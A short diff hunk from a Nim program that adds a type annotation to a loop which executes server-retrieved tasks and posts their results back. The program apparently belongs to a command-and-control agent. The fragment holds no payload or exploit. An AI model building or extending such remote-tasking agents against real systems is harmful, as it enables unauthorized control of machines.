@@ -60,7 +60,7 @@ proc main() =
         
         # Execute all retrieved tasks and return their output to the server
         for task in tasks: 
-            let result = task.handleTask(config)
+            let result: TaskResult = task.handleTask(config)
             discard config.postResults(agent, result)
             
 when isMainModule: 
